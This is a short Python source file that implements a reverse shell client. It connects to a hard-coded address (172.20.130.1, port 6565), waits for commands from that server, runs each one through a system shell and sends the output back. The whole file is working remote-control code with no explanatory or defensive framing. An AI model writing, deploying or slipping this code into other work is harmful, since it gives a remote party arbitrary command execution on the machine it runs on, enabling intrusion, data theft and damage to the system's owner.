import socket
import subprocess

FORMAT = "utf-8"


class Client:
    def __init__(self, address):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect(address)
        print(self.client.recv(1024).decode())

    def listen(self):
        while True:
            command = self.client.recv(1024).decode(FORMAT)
            try:
                result = subprocess.check_output(command, shell=True)
                self.client.send(result)
            except Exception as e:
                self.client.send(str(e).encode(FORMAT))


def main():
    address = ("172.20.130.1", 6565)
    client = Client(address)
    client.listen()


if __name__ == '__main__':
    main()
